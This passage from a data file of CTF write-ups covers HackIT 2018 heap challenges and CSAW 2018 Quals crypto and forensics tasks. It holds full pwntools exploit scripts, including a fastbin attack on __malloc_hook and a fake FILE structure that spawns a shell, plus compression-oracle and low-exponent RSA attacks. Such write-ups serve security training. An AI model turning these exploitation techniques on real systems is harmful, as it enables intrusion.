02\ndelete(fst4_0x30[2])\ndelete(fst4_0x30[0])\ndelete(fst4_0x30[1])\ndelete(fst4_0x30[3])\n\ngen_unsorted = create(\"3\", 0x20, \"1\")\ncreate(\"0\" * 0x10 + chr((0x90 + 0x60) | 1), 0x20, \"2\")\n\nfor i in xrange(0,3):\n\tcreate(\"leak\", 0x50, \"consume 0x60 chunks\")\n\t#take all 0x50, 0x30 will be allocated from top chunk\n\ntoleak = create(\"leak\", 0x50, \"to become leak here\")\n\ndelete(gen_unsorted)\n#unsorted bin contains 1 2 3 0x60, and one 0x30 fastbin\n\narb_rw = create(\"leak\", 0x10, \"A\") #0x30, 1\nstruct_overlap = create(\"leak\", 0x30, \"A\") #2, jmp out 3\nlibc_addr = u64(view(toleak)[1] + \"\\x00\\x00\") - UNSORTED_OFF\ncreate(\"leak\", 0x20, \"empty bins, leak pie\")\nflag_addr = u64(view(toleak)[1] + \"\\x00\\x00\") # - 0x202010\nprint hex(libc_addr)\nprint hex(flag_addr)\n#now bins empty\n\n# edit_statement(struct_overlap, \"H\" * 0x10 + p64(flag_addr) + p64(0x10) + p64(libc_addr+e.symbols[\"__free_hook\"]))\n# edit_statement(arb_rw, p64(libc_addr + e.symbols[\"system\"]))\n\ndelete(struct_overlap)\ncreate(\"arb read\", 0x30, \"H\" * 0x10 + p64(flag_addr) + p64(0x10) + p64(libc_addr+e.symbols[\"environ\"]))\nstack_addr = u64(view(arb_rw)[1] + \"\\x00\\x00\")\nprint hex(stack_addr)\n\ndelete(struct_overlap)\ncreate(\"arb write\", 0x30, \"H\" * 0x10 + p64(flag_addr) + p64(0xdeadbeef) + p64(libc_addr + GLOBAL_MAX_FAST)) #to test\nedit_statement(arb_rw, \"1\") #1 will let scanf return 1\n#change max_global_fast to 0\n\n#house of orange(by rewriting title size)\nsh.recvuntil(\"Enter title of bank account: \")\nsh.send(\"orange\")\nsh.recvuntil(\"Enter size of your bank statement: \")\nsh.send(str(0x20) + \"\\n\")\nslp()\nsh.send(\"house of orange\" + \"\\n\")\nsh.recvuntil(\"Account has been created at index \")\nof_chunk = int(sh.recvuntil(\"\\n\"))\nsh.recvuntil(\"5. View your bank status\\n\")\nhso_chunk = create(\"hso\", 0x50, \"house of orange\")\ncreate(\"pad\", 0x10, \"pad\")\ndelete(of_chunk)\n\ncreate(\"0\" * 0x10 + chr(0xC0 | 1), 0x50, 'A' * 0x20 + p64(0) + p64(0x31) + p64(flag_addr) + chr(0))\n\nfake_file = p64(0)\nfake_file += p64(0x61)\nfake_file += p64(1)\nfake_file += p64(libc_addr + e.symbols[\"_IO_list_all\"] - 0x10)\nfake_file += p64(2) + p64(3)\nfake_file += \"\\x00\" * 8\nfake_file += p64(libc_addr + next(e.search('/bin/sh\\x00'))) #/bin/sh addr\nfake_file += ((0xc0-0x40) / 8) * p64(flag_addr)\nfake_file += p32(0) #mode\nfake_file += (0xd8-0xc4) * \"\\x00\"\nfake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr\nfake_file += (0xe8-0xe0) * \"\\x00\"\nfake_file += p64(libc_addr + e.symbols[\"system\"])\n\nedit_title(hso_chunk, 'A' * 8 + fake_file)\n\nsh.send(\"1\\n\")\n\nsh.interactive()\n```\n\nHowever, the flag is `flag{Gu4rd_at_MALLOC_HOOK_bu1_n0t_4t_FREE_HOOK??}`, but I didn't use free hook at all, how can this pass the check of flag?\n\n## 982 Pwn / KAMIKAZE ##\n\n**Description**\n\n> This app is the secret to Eminem's lyrical genuis. Wonder what other info is hidden in there.\n> \n> `nc 185.168.131.14 6200`\n\n**Files provided**\n\n - [kamikaze](files/kamikaze)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe problem is here.\n\n```c\n//in create\nread(0, v3->buf_0x10, 0x10uLL);            // no term\n//in KAMIKAZE, which is a xor\nfor ( i = 0; i < strlen(v4->buf_0x10); ++i )\n  v4->buf_0x10[i] ^= seed; // strlen may > 0x10 !\n```\n\nso we can change the size of next chunk.\n\nHowever, it is restricted that `1 < seed <= 0xE`, so we can only change the least significat 4 bits; however, this is not related to size but is some bit flag. If we want to change the size, we must have chunk with `size > 0x100`, which cannot be allocated directly since only fast bin size is allowed. \n\nThus, we need to construct an unsorted bin first by shrinking the size of top chunk. If the size required by `malloc` is larger than the top chunk, and there are chunks in fast bin free list, these fast bins will be consolidated into an unsorted bin.\n\nLuckily, the top chunk size is `0x21000`, and after allocating some chunks, it will be `0x20XXX`, which can be shrinked if we xor it with 2, and at the same time the top chunk is still page aligned.\n\nAfter having an unsorted bin chunk, we can extend the unsorted bin to leak the libc and rewrite the pointer in the struct to achieve arbitrary write.\n\nUnlike the `Back Reimplemented` challenge, the `read` is used instead of `fgets`, so we can write 6 non-zero bytes if there are 6 non-zero bytes originally. What I did is to write the 0x70 fast bin list header in `main_arena` to `__malloc_hook - 0x23 ` (0x7f fast bin attack), thus rewriting the `__malloc_hook` to `one_gadget`\n\nexp:\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\nUNSORTED_OFF = 0x3c4b78\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nif g_local:\n\tsh = process('./kamikaze')#env={'LD_PRELOAD':'./libc.so.6'}\n\t#gdb.attach(sh)\nelse:\n\tsh = remote(\"185.168.131.14\", 6000)\n\ndef create(weight, data, size, short):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"the weight of the song: \")\n\tsh.send(str(weight) + \"\\n\")\n\tsh.recvuntil(\"size of the stanza: \")\n\tsh.send(str(size) + \"\\n\")\n\tsh.recvuntil(\"the stanza: \")\n\tsh.send(data + \"\\n\")\n\tsh.recvuntil(\"a short hook for it too: \")\n\tsh.send(short)\n\tsh.recvuntil(\">> \")\n\ndef edit(weight, data):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"song weight: \")\n\tsh.send(str(weight) + \"\\n\")\n\tsh.recvuntil(\"new stanza: \")\n\tsh.send(data)\n\tsh.recvuntil(\">> \")\n\ndef xor(weight, seed):\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"song weight: \")\n\tsh.send(str(weight) + \"\\n\")\n\tsh.recvuntil(\"seed: \")\n\tsh.send(str(seed) + \"\\n\")\n\tsh.recvuntil(\">> \")\n\ndef delete(weight):\n\tsh.send(\"4\\n\")\n\tsh.recvuntil(\"song weight: \")\n\tsh.send(str(weight) + \"\\n\")\n\tsh.recvuntil(\">> \")\n\ndef show(idx):\n\tsh.send(\"5\\n\")\n\tsh.recvuntil(\"song index: \")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"Weight: 0x\")\n\tweight = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"Stanza: \")\n\tbuf = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\">> \")\n\treturn (int(weight, 16), buf[:len(buf)-1])\n\ncreate(0, \"A\", 0x70, \"P\" * 0x10)\ncreate(1, \"A\", 0x30, \"P\")\nfor i in xrange(2,5):\n\tcreate(i, \"A\", 0x20, \"P\")\nfor i in xrange(2,5):\n\tdelete(i)\n#prepare many 0x20 fastbin chunks\n#so that 0x70 will be adjacent\n\nfor i in xrange(2,21):\n\tif i != 9:\n\t\tcreate(i, str(i), 0x70, \"P\" * 0x10)\n\telse:#fake a chunk here, for unsorted bin\n\t\tcreate(i, \"9\" * 0x10 + p64(0) + p64(0x61), 0x70, \"P\" * 0x10)\ncreate(21, \"A\", 0x20, \"P\" * 0x10)\ndelete(21)\ndelete(1)\n\n# topchunk size = 0x20171\n# 0x30: 0x5555557570b0 -> 0x555555757e30 -> 0x555555757e60 -> 0x0\n# 0x40: 0x5555557570e0 -> 0x0\n\ncreate(1, \"A\", 0x20, \"P\")\ncreate(21, \"A\", 0x30, \"P\" * 0x10)\n\nxor(21, 0x02)\nxor(21, 0x02)\n#topchunk size = 0x171\n\nfor i in xrange(2,6):\n\tdelete(i)\n#delete some 0x70+0x30 fastbins\n\nfor i in xrange(2,6):\n\tcreate(i, \"A\", 0x60, \"P\")\ndelete(2)\ndelete(3)\ncreate(2, \"consume 0x30\", 0x20, \"A\")\n#0x191 unsorted bin\n#2 0x70 fastbin\n\ncreate(22, \"leak\", 0x60, \"P\" * 0x10)\n#0x161 unsorted bin\nxor(22, 1 ^ 3)\n#0x363 unsorted bin\n\ncreate(23, \"consume\", 0x70, \"0xb0\")\ncreate(24, \"consume\", 0x70, \"0xb0\")\n\nlibc_addr = u64(show(1)[1] + \"\\x00\\x00\") - 0x3c4b78\nprint hex(libc_addr)\n\ncreate(25, \"consume\", 0x70, \"0xb0\")\n\ncreate(26, \"A\" * 0x18 + p64(0x31) + p64(2019) + p64(libc_addr + 0x3c4b50) + p64(0), 0x70, \"overlap\")\n\nedit(2019, p64(libc_addr + e.symbols[\"__malloc_hook\"] - 3 - 0x20)[:6])\n\ncreate(27, \"A\" * 0x13 + p64(libc_addr + 0xf02a4), 0x60, \"edit\")\nsh.send(\"1\\n\")\nsh.interactive()\n```\n\nHowever, the flag is `flag{D0n1_4lw4ys_trU5t_CALLOC_1ts_w3ird_lol}`, but I think my solution also works with `malloc`, so I've got unexpected solution for all 3 heap pwns XD\n\n## 1 Welcome / Get Going ##\n\n**Description**\n\n> [Welcome](https://ctf.hackit.ua/w31c0m3)\n\n**No files provided**\n\n**Solution**\n\nThe page displays:\n\n```\nWelcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯\n```\n\nBut if we open up the inspector, it shows a whole bunch of invisible Unicode characters between the first and the second characters. Zero-width joiners, zero-width non-joiners, etc. In fact, all the invisible characters used are (Unicode codepoints): `0x200b`, `0x200c`, `0x200d`, `0x200e`, `0x200f`.\n\nA quick search for e.g. \"zero-width unicode steganography\" leads us to [this page](https://330k.github.io/misc_tools/unicode_steganography.html) which does basically the same thing as what we need. The character selection doesn't include one of the codepoints that is used in the challenge; fortunately, the library which the page uses is [available](http://330k.github.io/misc_tools/unicode_steganography.js).\n\nThen we can simply decode the flag with Javascript:\n\n```js\nconst stego = require(\"./unicode_steganography.js\").unicodeSteganographer;\nstego.setUseChars('\\u200b\\u200c\\u200d\\u200e\\u200f');\nconsole.log(stego.decodeText(\"W​​​​‏​‍​​​​‏‌‎​​​​‎‏‍​​​​‏​‎​​​​‏‏‎​​​​‏‎‏​​​​‍​‌​​​​‎‏​​​​​‏​‎​​​​‏‍‏​​​​‍​‌​​​​‍​‌​​​​‍‌​​​​​‎‏​​​​​‏​‏​​​​‍​‍​​​​‎‏‏​​​​‏‌‍​​​​‍​‌​​​​‏‍‏​​​​‏‏‍​​​​‎‏​​​​​‏‎‏​​​​‌‏‏​​​​‏‎‌​​​​‏​‏​​​​‎‏​​​​​‏‎‍​​​​‏‍​​​​​‌‏‏​​​​‎‏‏​​​​‌‏‎​​​​‏​​​​​​‍​‌​​​‌​​​elcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯\"));\n```\n\n`flag{w3_gr337_h4ck3rz_w1th_un1c0d3}`\n", "timestamp": "2025-10-24T11:39:07.556869"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-09-14-CSAW-CTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-14-CSAW-CTF-Quals/README.md", "content": "# 2018-09-14-CSAW-CTF-Quals #\n\n[CTFTime link](https://ctftime.org/event/633) | [Website](https://ctf.csaw.io/)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [x] [50 babycrypto](#50-crypto--babycrypto)\n - [x] [100 flatcrypt](#100-crypto--flatcrypt)\n - [x] [200 lowe](#200-crypto--lowe)\n - [ ] 400 Holywater\n - [ ] 500 Collusion\n\n### Forensics ###\n\n - [x] [150 simple_recovery](#150-forensics--simple_recovery)\n - [x] [200 🐼 Rewind](#200-forensics---rewind)\n - [x] [300 mcgriddle](#300-forensics--mcgriddle)\n - [x] [300 whyOS](#300-forensics--whyos)\n\n### Misc ###\n\n - [x] [1 Twitch Plays Test Flag](#1-misc--twitch-plays-test-flag)\n - [x] [50 bin_t](#50-misc--bin_t)\n - [x] [75 Short Circuit](#75-misc--short-circuit)\n - [x] [100 Algebra](#100-misc--algebra)\n - [x] [200 Take an L](#200-misc--take-an-l)\n\n### Pwn ###\n\n - [x] [25 bigboy](#25-pwn--bigboy)\n - [x] [50 get it?](#50-pwn--get-it)\n - [x] [100 shell->code](#100-pwn--shell-code)\n - [x] [200 doubletrouble](#200-pwn--doubletrouble)\n - [x] [250 turtles](#250-pwn--turtles)\n - [x] [300 PLC](#300-pwn--plc)\n - [x] [400 alien invasion](#400-pwn--alien-invasion)\n\n### Reversing ###\n\n - [x] [50 A Tour of x86 - Part 1](#50-reversing--a-tour-of-x86---part-1)\n - [x] [100 A Tour of x86 - Part 2](#100-reversing--a-tour-of-x86---part-2)\n - [x] [200 A Tour of x86 - Part 3](#200-reversing--a-tour-of-x86---part-3)\n - [ ] 400 Not Protobuf\n - [ ] 500 1337\n - [x] [500 kvm](#500-reversing--kvm)\n\n### Web ###\n\n - [x] [50 Ldab](#50-web--ldab)\n - [x] [100 sso](#100-web--sso)\n - [ ] 200 Hacker Movie Club\n - [ ] 400 No Vulnerable Services\n - [ ] 500 WTF.SQL\n\n---\n\n## 50 Crypto / babycrypto ##\n\n**Description**\n\n> yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet\n> \n> single yeet yeeted with single yeet == 0\n> \n> yeeet\n> \n> what is yeet?\n> \n> yeet is yeet\n> \n> Yeetdate: yeeted yeet at yeet: 9:42 pm\n\n**Files provided**\n\n - [`ciphertext.txt`](files/babycrypto-ciphertext.txt)\n\n**Solution**\n\nIf we decode the ciphertext with Base64, we see a lot of non-ASCII characters:\n\n    $ base64 -D < ciphertext.txt > b64dec.bin\n    $ xxd b64dec.bin\n    0000000: b39a 9091 df96 8cdf 9edf 8f8d 9098 8d9e  ................\n    0000010: 9292 9a8d df88 9790 df9e 8c8f 968d 9a8c  ................\n    0000020: df8b 90df 9c8d 9a9e 8b9a df8f 8d90 988d  ................\n    0000030: 9e92 8cdf 8b97 9e8b df97 9a93 8fdf 8f9a  ................\n    0000040: 908f 939a df9b 90df 939a 8c8c d1df b79a  ................\n    0000050: df88 9e91 8b8c df8b 90df 8f8a 8bdf 9e8a  ................\n    0000060: 8b90 929e 8b96 9091 df99 968d 8c8b d3df  ................\n    0000070: 9e91 9bdf 8c9c 9e93 9e9d 9693 968b 86df  ................\n    0000080: 9e93 9091 988c 969b 9ad1 dfb7 9adf 9b8d  ................\n    0000090: 9a9e 928c df90 99df 9edf 8890 8d93 9bdf  ................\n    00000a0: 8897 9a8d 9adf 8b97 9adf 9a91 9b93 9a8c  ................\n    00000b0: 8cdf 9e91 9bdf 8b97 9adf 9691 9996 9196  ................\n    00000c0: 8b9a df9d 9a9c 9092 9adf 8d9a 9e93 968b  ................\n    00000d0: 969a 8cdf 8b90 df92 9e91 9496 919b d3df  ................\n    00000e0: 9e91 9bdf 8897 9a8d 9adf 8b97 9adf 8b8d  ................\n    00000f0: 8a9a df89 9e93 8a9a df90 99df 9396 999a  ................\n    0000100: df96 8cdf 8f8d 9a8c 9a8d 899a 9bd1 9993  ................\n    0000110: 9e98 849b 9699 9996 9ad2 979a 9393 929e  ................\n    0000120: 91d2 98cf 8f97 cc8d 858d 9eb0 a6ce b59e  ................\n    0000130: 93cb 9cb7 9eb9 a6c6 aca8 ad86 beae c99e  ................\n    0000140: b782                                     ..\n\nIn fact, not a single byte is ASCII data - all the bytes are higher than `0x7F`. This indicates that the MSB (most significant bit) is `1` for all bytes. It also shows that this might not be the result of a \"standard\" cipher, which would (attempt to) distribute the values over the entire spectrum.\n\nSo an obvious possibility was that the MSB was simply set on all the bytes, and to decode we should ignore the byte:\n\n```python\nimport sys\nwith open(\"b64dec.bin\", \"rb\") as f:\n  encoded = f.read()\n  for c in encoded:\n    sys.stdout.write(chr(ord(c) & 0x7F))\n```\n\nThis produces some more ASCII-looking data, but it is still not readable and the most common character seems to be `_`. An underscore is `0x5F`, and if we put back the MSB we ignored, that value is `0xDF`, or `0b11011111`. If this is English text, we would expect the most common character to be `0x20` (a space), which happens to be `0x20`, or `0b00100000`. All the bits are inverted, so let's see if this works:\n\n```python\nimport sys\nwith open(\"b64dec.bin\", \"rb\") as f:\n  encoded = f.read()\n  for c in encoded:\n    sys.stdout.write(chr(ord(c) ^ 0xFF))\n```\n\nAnd indeed:\n\n    $ python invertBits.py\n\n> Leon is a programmer who aspires to create programs that help people do less. He wants to put automation first, and scalability alongside. He dreams of a world where the endless and the infinite become realities to mankind, and where the true value of life is preserved.flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}\n\nThe flag seems a bit unrelated.\n\n`flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}`\n\n## 100 Crypto / flatcrypt ##\n\n**Description**\n\n> no logos or branding for this bug\n> \n> Take your pick nc `crypto.chal.csaw.io 8040` `nc crypto.chal.csaw.io 8041` `nc crypto.chal.csaw.io 8042` `nc crypto.chal.csaw.io 8043`\n> \n> flag is not in flag format. flag is PROBLEM_KEY\n\n**Files provided**\n\n - [`serv-distribute.py`](files/flatcrypt-serv-distribute.py)\n\n**Solution**\n\nLet's examine the script:\n\n```python\ndef encrypt(data, ctr):\n  return AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter = ctr).encrypt(zlib.compress(data))\n\nwhile True:\n  f = input(\"Encrypting service\\n\")\n  if len(f) < 20:\n    continue\n  enc = encrypt(\n    bytes(\n      (PROBLEM_KEY + f).encode('utf-8')\n    ),\n    Counter.new(64, prefix = os.urandom(8))\n  )\n  print(\"%s%s\" % (enc, chr(len(enc))))\n```\n\nOur target is `PROBLEM_KEY` and we don't know `ENCRYPT_KEY`.\n\nWhenever we interact with the script, we have to give it at least 20 bytes of data. It then prepends `PROBLEM_KEY` to our data, uses `zlib` to compress the result, and finally encrypts that using AES-CTR with a random counter. We get to see the encrypted result and the length of that data.\n\nSo there are a few things to note here. First of all, AES-CTR is not a block cipher, it is a stream cipher - it encrypts each byte separately and hence the size of the cipher text is the same as the size of the plain text. This is different from e.g. AES-CBC.\n\n`zlib` is a standard compression library. By definition, it tries to compress data, i.e. make the output smaller than the input. The way this works is by finding sequences of data which occur multiple times in the input and replacing them with back-references. It works at the byte level, i.e. it can compress `1234 1234` to `1234 <back-ref to 1234>`, but it cannot compress `1234 5678` to  `1234 <back-ref to 1234 with +4 to byte values>`.\n\n    $ python3\n    >>> import zlib\n    >>> # all bytes from 0 to 255:\n    >>> len(bytes([ i for i in range(256) ]))\n    256\n    >>> # zlib compression makes the result larger:\n    >>> len(zlib.compress(bytes([ i for i in range(256) ])))\n    267\n    >>> # the sequence 0, 1, 2, 3, 0, 1, 2, 3, ...:\n    >>> len(bytes([ i % 4 for i in range(256) ]))\n    256\n    >>> # zlib compression identifies the repeating 0, 1, 2, 3:\n    >>> len(zlib.compress(bytes([ i % 4 for i in range(256) ])))\n    15\n\nWhat do we actually do in this challenge? We cannot decrypt the AES, since we don't know the encryption key and the counter is 8 random bytes that would be very hard to predict. The only information leak that we have available is the size of the cipher text, and this depends on how well the `zlib` compression performs.\n\nIf you are not familiar with an attack like this, see [CRIME](https://en.wikipedia.org/wiki/CRIME) or [BREACH](https://en.wikipedia.org/wiki/BREACH).\n\nHow does `zlib` compression help us? Let's assume that `PROBLEM_KEY` is the string `good_secret`. Now let's append `baad` and `good` to `PROBLEM_KEY`, compress it, and check the length of the result:\n\n    >>> len(zlib.compress(b\"good_secret\" + b\"baad\"))\n    23\n    >>> len(zlib.compress(b\"good_secret\" + b\"good\"))\n    21\n\nThe length of the string we appended was the same, and yet the second is shorter - because `good` is a part of `PROBLEM_KEY` and hence even without knowing what `PROBLEM_KEY` is, we can tell that it contains `good`.\n\nSo this will be our general approach: send various strings to the server and character-by-character we can find out what `PROBLEM_KEY` is, based on how well our attempts compress.\n\nThere is just one complication in this challenge, and it is that our input needs to be at least 20 bytes. This is why the above-mentioned fact that `zlib` operates on the byte level is important to us. We can prepend our test string with 20 bytes that will definitely not occur in `PROBLEM_KEY`. The challenge tells us what the search space is for `PROBLEM_KEY`:\n\n```python\n# Determine this key.\n# Character set: lowercase letters and underscore\nPROBLEM_KEY = 'not_the_flag'\n```\n\nWe can easily find a simple 20-byte string that doesn't contain lowercase characters or underscores: `1234567890ABCDEFGHIJ`. Even better, we can use it to our advantage. This will be the general outline of our search algorithm:\n\n - `padding` := \"1234567890ABCDEFGHIJ\"\n - start with an empty `known_flag` string\n - while `known_flag` is not the full flag:\n   - for each `candidate` in the key alphabet:\n     - send `padding` + `candidate` + `known_flag` + `padding` to the server\n   - prepend the best-compressed `candidate` to `known_flag`\n\nDuring the CTF my script first started with a three-byte string found by brute-force, then extended the candidate in both directions, but the above method is much simpler and less bandwidth-intensive.\n\n([Full Python script here](scripts/flatcrypt.py))\n\n    $ python solve.py\n    o\n    go\n    ogo\n    logo\n    _logo\n    a_logo\n    _a_logo\n    e_a_logo\n    ve_a_logo\n    ave_a_logo\n    have_a_logo\n    _have_a_logo\n    t_have_a_logo\n    nt_have_a_logo\n    snt_have_a_logo\n    esnt_have_a_logo\n    oesnt_have_a_logo\n    doesnt_have_a_logo\n    _doesnt_have_a_logo\n    e_doesnt_have_a_logo\n    me_doesnt_have_a_logo\n    ime_doesnt_have_a_logo\n    rime_doesnt_have_a_logo\n    crime_doesnt_have_a_logo\n    done!\n\n`flag{crime_doesnt_have_a_logo}`\n\n## 200 Crypto / lowe ##\n\n**Description**\n\n> I personally prefer Home Depot\n> \n> XOR Passes are the easiest way to use numbers to encrypt!\n> \n> By Kris Kwiatkowski, Cloudflare\n\n**Files provided**\n\n - [`file.enc`](files/lowe-file.enc)\n - [`key.enc`](files/lowe-key.enc)\n - [`publickey.pem`](files/lowe-publickey.pem)\n\n**Solution**\n\nFirst of all, let's have a look at all the files.\n\n`file.enc` is Base64-encoded data, but it looks encrypted:\n\n    $ base64 -D < file.enc > file.bin\n    $ xxd file.bin\n    0000000: 912b 68ca 798d e4b4 a78a e7b4 9c3c 658b  .+h.y........<e.\n    0000010: d72c 4ab0 607b 167f 60ea 397b e314 91f2  .,J.`{..`.9{....\n    0000020: 4ac2 f86d f211 ec63 2306 558c cc94 ea7d  J..m...c#.U....}\n    0000030: b001 41ac f09b 9b85 00e2 7ee8 32bd b396  ..A.......~.2...\n\n`key.enc` is a 462-digit (in decimal) number.\n\n`publickey.pem` is an ASCII-formatted public key:\n\n    $ openssl rsa -pubin -in pubkey.pem -text -noout\n    Public-Key: (1536 bit)\n    Modulus:\n        00:cf:70:7e:ed:97:90:17:b7:f6:f4:76:ff:3b:a6:\n        55:59:ad:b1:82:e0:7c:fa:23:33:b1:ec:05:6b:7f:\n        7b:96:12:40:54:f1:f5:74:8b:04:c3:69:4e:90:f0:\n        d9:9f:ee:05:84:a8:7a:70:81:75:80:d4:93:93:32:\n        1b:b2:08:07:ff:de:25:a4:c8:ab:d4:6d:95:c1:e3:\n        74:0d:9e:64:1f:e7:7f:9b:96:ce:ca:e9:18:e6:7a:\n        24:89:52:b5:da:81:ae:77:42:bd:ae:51:b1:29:24:\n        59:73:41:50:57:ae:75:df:b7:5a:78:e8:24:37:9e:\n        52:50:65:92:c3:75:0e:9a:1c:7e:70:1b:ee:8d:df:\n        c7:a9:ca:72:53:4c:d3:b0:95:79:f8:7a:4e:b3:76:\n        f9:26:7c:d1:a1:6e:1e:57:90:95:c5:b8:6f:4b:8f:\n        24:fb:61:3f:08:a7:e0:e4:75:d2:55:56:ae:41:c8:\n        ce:e2:48:e9:0d:ac:96:5d:c4:7d:db:b4:c5\n    Exponent: 3 (0x3)\n\nIt is an RSA public key. The one thing that should immediately stand out is that the exponent `e` is very low. In fact, the challenge title `lowe` must be referring to this fact. Since RSA operates on data in the form of numbers, we can guess that `key.enc` is actually the result of RSA encryption, formatted as decimal digits instead of the usual binary data.\n\nAlso, we can consult e.g. Wikipedia on [attacks against plain RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA) and see that a low exponent can mean that the exponentiated plain text will be strictly less than the modulus `n`. If this were the case, we could simply take the root (in this case the cube root) of the cipher text (i.e. the `key.enc` number) and get back the plain text.\n\n    $ python3\n    >>> import gmpy2\n    >>> e = gmpy2.mpz(3)\n    >>> cipher = gmpy2.mpz(219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182)\n    >>> gmpy2.iroot(cipher, e)\n    (mpz(6028897571524104587358191144119083924650151660953920127739581033174354252210219577997969114849529704172847232120373331804620146706030387812427825026581462), False)\n\nUnfortunately, this did not work - the second value in the tuple returned by `gmpy2.iroot` (integer root) indicates whether the root is exact. It is `False` in this case, so the returned number is not the actual plain text.\n\nBut `n` is fairly large, and `e` is really low, so let's not give up immediately. If `p^e`, i.e. the exponentiated plain text is not strictly smaller than `n`, then perhaps it only \"overflowed\" through the modulus a small number of times. We can check if `c + n` has an exact cube root, then `c + 2 * n`, and so on.\n\n    >>> n = gmpy2.mpz(0xcf707eed979017b7f6f476ff3ba65559adb182e07cfa2333b1ec056b7f7b96124054f1f5748b04c3694e90f0d99fee0584a87a70817580d49393321bb20807ffde25a4c8abd46d95c1e3740d9e641fe77f9b96cecae918e67a248952b5da81ae7742bdae51b129245973415057ae75dfb75a78e824379e52506592c3750e9a1c7e701bee8ddfc7a9ca72534cd3b09579f87a4eb376f9267cd1a16e1e579095c5b86f4b8f24fb613f08a7e0e475d25556ae41c8cee248e90dac965dc47ddbb4c5)\n    >>> gmpy2.iroot(cipher + n, e)\n    (mpz(12950973085835763560175702356704747094371821722999497961023063926142573092871510801730909790343717206777660797494675328809965345887934044682722741193527531), True)\n    >>> plain = int(gmpy2.iroot(cipher + n, e)[0])\n\nAnd yes, `c + n` already has an exact cube root, no need to do a long and computationally heavy search. So what did we decrypt, exactly?\n\n    >>> hex(plain)\n    '0xf74709ad02fe85d8d3f993d5ff5716eabb5829df0d12624a048e0a4bd726a6c428a3cd5ac6248900113733effdf1dc4b8837209c92a9a3e161d0478d04dbd0eb'\n\nIt doesn't look like ASCII data. But the challenge description mentions XOR encryption. Also, the file we haven't used yet, `file.enc`, contains 64 bytes of data, and the key we just RSA-decrypted is also 64 bytes. Let's try to XOR the two:\n\n    >>> key = bytes.fromhex(hex(plain)[2:])\n    >>> data = open(\"file.bin\", \"rb\").read()\n    >>> bytes([ k ^ d for (k, d) in zip(key, data) ])\n    b'flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}'\n\nAgain an unrelated-looking flag.\n\n`flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}`\n\n## 150 Forensics / simple_recovery ##\n\n**Description**\n\n> Simple Recovery Try to recover the data from these RAID 5 images!\n\n**Files provided**\n\n - [`disk.img0.7z`](files/simple_recovery-disk.img0.7z)\n - [`disk.img1.7z`](files/simple_recovery-disk.img1.7z)\n\n**Solution**\n\nAfter extraction, we can check if the flag is hidden in plain text:\n\n    $ strings disk.* | grep \"flag{\"\n    <photoshop:LayerName>flag{dis_week_evry_week_dnt_be_securty_weak}</photoshop:LayerName>\n    <photoshop:LayerText>flag{dis_week_evry_week_dnt_be_securty_weak}</photoshopTOSHOP\n\nAnd it is...\n\n`flag{dis_week_evry_week_dnt_be_securty_weak}`\n\n## 200 Forensics / 🐼 Rewind ##\n\n**Description**\n\n> Sometimes you have to look back and replay what has been done right and wrong\n\n**Files provided**\n\n - [`rewind.tar.gz`](https://ctf.csaw.io/files/ad0ffb17480563d0658ec831d0881789/rewind.tar.gz) (too large to host)\n\n**Solution**\n\nOnce again, after extraction, let's check if the flag is hidden in plain text:\n\n    $ strings disk.* | grep \"flag{\"\n    while [ true ]; do printf \"flag{FAKE_FLAG_IS_ALWAYS_GOOD}\" | ./a.out; done\n    while [ true ]; do printf \"flag{FAKE_FLAG_IS_ALWAYS_GOOD}\" | ./a.out; done\n    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}\n    ... (repeats)\n    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}\n    while [ true ]; do printf \"flag{FAKE_FLAG_IS_ALWAYS_GOOD}\" | ./a.out; done\n    ...\n    while [ true ]; do printf \"flag{FAKE_FLAG_IS_ALWAYS_GOOD}\" | ./a.out; done\n    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}\n    ...\n    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}\n\nAnd it is there again. I think the organisers overlooked this in both this challenge and [simple_recovery](#150-forensics--simple_recovery).\n\nWhat this challenge *should* have been, I assume, is to get QEMU to replay the given VM snapshot with the given \"replay\" (which records all user interactions and non-deterministic I/O).\n\n`flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}`\n\n## 300 Forensics / mcgriddle ##\n\n**Description**\n\n> All CTF players are squares\n> \n> Edit (09/14 8:22 PM) - Uploaded new pcap file\n> \n> Edit (09/15 12:10 AM) - Uploaded new pcap file\n\n**Files provided**\n\n - (before updates) [`output.pcap`](files/mcgriddle-output.pcap)\n - [`final.pcap`](files/mcgriddle-final.pcap)\n\n**Solution**\n\nLooking through (either) `pcap`, we can see that a chess game is being played, and the moves are indicated with [algebraic chess notation](https://en.wikipedia.org/wiki/Algebraic_notation_%28chess%29). The server responds with its own moves, and between the moves, SVG files are uploaded, each containing an `8 x 8` grid of characters, all of which seem to be 